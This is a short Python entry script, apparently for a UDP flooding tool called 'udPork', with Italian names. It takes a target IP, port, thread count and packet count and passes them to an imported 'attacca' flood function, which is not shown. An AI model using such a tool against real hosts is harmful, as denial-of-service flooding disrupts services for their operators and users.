from moduli_udPork import argomenti, flooder, log, banner

def main():
    banner.banner()


    args = argomenti.argomenti()

    ip = args.ip
    porta = args.porta
    threads = args.threads
    numero_pacchetti = args.numero_pacchetti
    file_di_log = args.file_di_log

    print("Riassunto di ciò che hai scelto:\n")
    print(f"IP: {ip}")
    print(f"PORTA: {porta}")
    print(f"THREADS: {threads}")
    print(f"N° PACCHETTI: {numero_pacchetti}")
    print(f"FILE LOG: {file_di_log}\n")

    flooder.attacca(ip, porta, threads, numero_pacchetti, file_di_log)

if __name__ == "__main__":
    main()